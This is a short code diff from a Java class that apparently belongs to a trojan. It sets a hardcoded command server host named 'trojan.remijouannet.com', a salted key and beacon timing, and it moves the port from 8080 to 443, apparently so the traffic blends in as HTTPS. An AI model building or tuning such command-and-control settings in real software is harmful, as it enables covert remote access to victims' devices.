@@ -39,7 +39,7 @@ public class ConnectionServerThread implements Runnable {
         this.httpURLConnection = new HttpsURLConnectionHelper();
         this.KEY = SALT + "8df639b301a1e10c36cc2f03bbdf8863";
         this.host = "trojan.remijouannet.com";
-        this.port = "8080";
+        this.port = "443";
         this.timeon = 4000;
         this.timeoff = 54000;
         this.time = timeon;
